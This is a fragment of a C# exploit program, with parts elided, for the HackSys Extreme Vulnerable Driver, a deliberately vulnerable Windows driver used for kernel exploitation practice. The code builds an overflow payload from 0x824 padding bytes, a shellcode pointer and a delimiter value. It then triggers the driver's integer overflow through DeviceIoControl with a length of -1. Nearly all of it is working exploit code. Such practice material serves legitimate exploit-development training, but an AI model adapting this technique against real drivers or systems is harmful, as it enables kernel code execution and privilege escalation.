...
namespace IntegerOverflow
{
    class Program
    {
        ...
        static void Main()
        {
            ...
            Console.WriteLine("--[ HEVD Exploitation : Integer Overflow\n");
            ...
            byte[] offset = Encoding.ASCII.GetBytes(new string('A', 0x824));
            byte[] pointer = BitConverter.GetBytes(ShellcodeBuffer.ToInt32());
            byte[] delimiter = BitConverter.GetBytes((uint)0xBAD0B0B0);
            byte[] payload = new byte[offset.Length + pointer.Length + delimiter.Length];
            offset.CopyTo(payload, 0);
            pointer.CopyTo(payload, offset.Length);
            delimiter.CopyTo(payload, offset.Length + pointer.Length);
            ...
            Console.WriteLine("[>] Triggering integer overflow");
            bool status = DeviceIoControl(hDevice, ioctl, payload, -1, IntPtr.Zero, 0, ref BytesReturned, IntPtr.Zero);
